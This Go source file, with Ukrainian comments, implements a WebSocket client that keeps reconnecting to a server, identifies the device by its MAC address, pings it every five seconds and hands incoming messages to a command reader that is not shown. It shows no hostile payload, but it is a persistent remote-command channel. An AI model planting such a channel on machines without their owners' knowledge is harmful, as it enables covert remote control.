package management

import (
	"Anthophila/information"
	"github.com/gorilla/websocket"
	"log"
	"time"
)

const (
	reconnectInterval = 5 * time.Second // Інтервал для повторних спроб підключення
)

// Manager структура, що представляє управління підключенням до WebSocket сервера
type Manager struct {
}

// Start ініціалізує підключення до WebSocket сервера і обробляє повідомлення
func (f *Manager) Start(logAddress, serverAddr string) {
	// Отримання MAC-адреси пристрою
	macAddress := information.NewInfo().GetMACAddress()

	var wSocket *websocket.Conn
	var err error
	var errPing error

	for {
		// Спроба підключення до сервера WebSocket
		wSocket, _, err = websocket.DefaultDialer.Dial(serverAddr, nil)
		if err != nil {
			// Логування помилки підключення
			log.Printf("Error connecting to server: %v", err)
			log.Printf("Retrying in %v...", reconnectInterval)
			// Затримка перед наступною спробою підключення
			time.Sleep(reconnectInterval)
			continue
		}

		// Підключення успішне, надсилаємо нікнейм
		err = wSocket.WriteMessage(websocket.TextMessage, []byte("nick:"+macAddress))
		if err != nil {
			// Логування помилки відправки нікнейму
			log.Printf("Error sending nickname: %v", err)
			wSocket.Close()
			log.Printf("Retrying in %v...", reconnectInterval)
			// Затримка перед наступною спробою підключення
			time.Sleep(reconnectInterval)
			continue
		}

		// Запуск горутіни для обробки отриманих повідомлень від сервера
		go NewReader().ReadMessageCommand(logAddress, wSocket)

		// Основний цикл для надсилання повідомлень до сервера
		for {
			select {
			case <-time.After(reconnectInterval):
				// Надсилання пінгу для перевірки з'єднання
				errPing = wSocket.WriteMessage(websocket.TextMessage, []byte("Ping"))
			}

			if errPing != nil {
				// Логування помилки при надсиланні пінгу
				log.Printf("Error writing to server: %v", errPing)
				// Вихід з циклу при помилці
				break
			}
		}

		// Якщо ми потрапили сюди, це означає, що з'єднання було розірвано
		log.Printf("Connection closed. Retrying in %v...", reconnectInterval)
		wSocket.Close()
		// Затримка перед наступною спробою підключення
		time.Sleep(reconnectInterval)
	}
}
